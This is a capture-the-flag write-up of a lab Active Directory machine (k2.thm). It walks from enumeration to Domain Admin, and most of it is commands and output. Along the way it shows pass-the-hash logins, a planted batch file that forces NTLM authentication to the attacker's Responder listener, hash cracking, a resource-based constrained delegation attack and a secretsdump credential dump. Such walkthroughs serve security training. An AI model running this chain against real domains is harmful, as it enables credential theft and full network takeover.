# The Summit

Date: May 15–16, 2026
Target IP: 10.114.145.107

## About

```
You are almost there; you can see the summit from where you stand. Even the IT team is impressed at how far you have made into the network.

You can't stop now; with all of the information gathered, you will reach the very top and prove your skills.
```

## Tasks

1. What is the user flag?
2. What is the root flag?


## Initial Enumeration

We kick things off with an nmap scan as usual!

```bash
nmap -sCV -Pn -oN nmap/initial 10.114.145.107 -v
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 12:26:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwvehicleped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-15T12:26:55+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Another AD machine. Key services:

| Port       | Service  | Note           |
| ---------- | -------- | -------------- |
| 88         | Kerberos |                |
| 389 / 3268 | LDAP     | AD enumeration |
| 445        | SMB      |                |
| 3389       | RDP      |                |
| 5985       | WinRM    | Shell target   |

- **Domain:** `k2.thm`
- **DC:** `K2RootDC.k2.thm`
- **OS:** Windows Server 2019 (build 10.0.17763)

```bash
echo "10.114.145.107 k2.thm K2RootDC.k2.thm" >> /etc/hosts
```


## Credential Reuse from Middle Camp

First I want to check if any of the users from previous tasks can be targeted on this machine.

```bash
kerbrute userenum --dc K2ROOTDC -d k2.thm usernames.txt
# [+] VALID USERNAME: j.smith@k2.thm
```

![[Pasted image 20260515143711.png]]

We get that `j.smith` is a valid user on this box as well.

Turns out that the `Administrator` hash we found in previous task works for `j.smith`! 

```bash
nxc smb k2.thm -u j.smith -H 9545b61858c043477c350ae86c37b32f    # Valid
nxc winrm k2.thm -u j.smith -H 9545b61858c043477c350ae86c37b32f  # Pwn3d!
```

![[Pasted image 20260515144211.png]]


## WinRM as j.smith

```bash
evil-winrm -i k2rootdc.k2.thm -u j.smith -H 9545b61858c043477c350ae86c37b32f
```

There was no user flag, `j.smith` is a low-privilege domain user, but looking at the `C:\Users` we find `o.armstrong`. 
Access denied, but is very likely to be our next move!

![[Pasted image 20260515145055.png]]

Inside `C:\Scripts` we also find `backup.bat` that copies `C:\Users\o.armstrong\Desktop\notes.txt` to `C:\Users\o.armstrong\Documents\backup_notes.txt`.

![[Pasted image 20260515145518.png]]

We can't write to the `backup.bat` since it runs as `o.armstrong`, the file itself isn't writable but we can write to the folder `\Scripts`!

```powershell
Get-ACL C:\Scripts | Format-List
# j.smith Allow FullControl  ← on the folder
Get-ACL C:\Scripts\backup.bat | Format-List
# j.smith → only ReadAndExecute
```

![[Pasted image 20260515150200.png]]

![[Pasted image 20260515150227.png]]

**FullControl over a folder = Can delete and recreate any file inside it!**


## Responder → NTLMv2 Hash Capture

With this access, we replace `backup.bat` with a UNC path pointing to our machine, forcing `o.armstrong` to reach out to us, while we are listening with Responder on our attacking-machine. This way we can try capturing the NTLMv2 hash!

```bash
responder -I tun0
```

```powershell
Set-Content -Path "C:\Scripts\backup.bat" -Value "copy \\MYIP\hello.txt C:\Users\o.armstrong\Documents\hello.txt"
```

When the scheduled task triggers, Responder catches the authentication attempt:

![[Pasted image 20260517221620.png]]

Using hashcat we find the password:

```bash
$ hashcat armstronghash.txt /usr/share/wordlists/rockyou.txt 
...
O.ARMSTRONG::K2:877c58002d3e8543:d7e66c6555fb5b4c8725b86b22e69647:01010000000000000029d03b42e6dc01050c62da412d83780000000002000800390033005200510001001e00570049004e002d004d0033003400520056004b0038003900580049004d0004003400570049004e002d004d0033003400520056004b0038003900580049004d002e0039003300520051002e004c004f00430041004c000300140039003300520051002e004c004f00430041004c000500140039003300520051002e004c004f00430041004c00070008000029d03b42e6dc0106000400020000000800300030000000000000000000000000210000d41d51090382b1512be9268ea8bb8884707003218a6e604d5bd01a787180088f0a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100370039002e003100340030000000000000000000:arMStronG08
...
```

**Password:** `arMStronG08`


## WinRM as o.armstrong

Now we can access `o.armstrong` with Evil-WinRM with the newly found password.

```bash
evil-winrm -i k2.thm -u o.armstrong -p 'arMStronG08'
```

In `C:\Users\o.armstrong\Documents` we find `backup_notes.txt`:

![[Pasted image 20260517222550.png]]

That's already done in Task 1! 8)

In `C:\Users\o.armstrong\Desktop` we find **User flag**, and `notes.txt`, which tells us the same thing `backup_notes.txt` does.

*(Forgot picture)*
**User flag:** `THM{400002b4b9fa7decb59019364388b8a3}`


## BloodHound Enumeration

Now that we have access to this account, BloodHound is my next step to get and overview of where I am and what privileges I have, maybe we can escalate to Administrator!

```
bloodhound-python -u o.armstrong -p 'arMStronG08' -d k2.thm -dc K2ROOTDC.k2.thm -c all --dns-tcp --dns-timeout 30 -ns 10.113.148.33
```

We are able to see `IT Director`, which can also be found using:

```powershell
net user o.armstrong /domain
```

![[Pasted image 20260517223950.png]]

![[Pasted image 20260517224047.png]]

**Attack path:**

```
o.armstrong → [MemberOf] → IT Director → [GenericWrite] → K2ROOTDC.k2.thm
```

`IT Director` is a non-default group. `GenericWrite` on a **computer object** enables **Resource-Based Constrained Delegation (RBCD) attack**.


## RBCD Attack → Domain Admin

RBCD works by setting the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer to trust a machine account we control. With that trust in place, we can request a Kerberos service ticket impersonating any user, including Administrator.

![[Pasted image 20260517224947.png]]


**Step 1 — Create a controlled machine account**

`j.smith` has `SeMachineAccountPrivilege` (standard for domain users), allowing us to add machine accounts to the domain:

```bash
impacket-addcomputer k2.thm/j.smith -hashes :9545b61858c043477c350ae86c37b32f -computer-name 'ATTACKER$' -computer-pass 'Password123!' -dc-ip 10.113.148.33
```

**Step 2 — Set RBCD on the DC**

Using `o.armstrong`'s GenericWrite rights, write `ATTACKER$`'s SID into the DC's RBCD attribute:

```bash
impacket-rbcd k2.thm/o.armstrong:'arMStronG08' -dc-ip 10.113.148.33 -action write -delegate-to 'K2ROOTDC$' -delegate-from 'ATTACKER$'
```

**Step 3 — Request a service ticket impersonating Administrator**

```bash
impacket-getST k2.thm/'ATTACKER$':'Password123!' -spn cifs/K2ROOTDC.k2.thm -impersonate Administrator -dc-ip 10.113.148.33
```

**Step 4 — Dump all hashes**

```bash
export KRB5CCNAME=Administrator@cifs_K2ROOTDC.k2.thm@K2.THM.ccache
impacket-secretsdump -k -no-pass K2ROOTDC.k2.thm
```

**Violá!**

![[Pasted image 20260517230019.png]]

**Administrator NTLM hash:** `15ecc755a43d2e7c8001215609d94b90`


## Root flag

```bash
evil-winrm -i k2.thm -u Administrator -H 15ecc755a43d2e7c8001215609d94b90
```

![[Pasted image 20260517230407.png]]

**Root flag:** `THM{2000099729df1a4ec18bc0346d36b5ba}`

**Domain Admin PWNED! And Summit reached!**
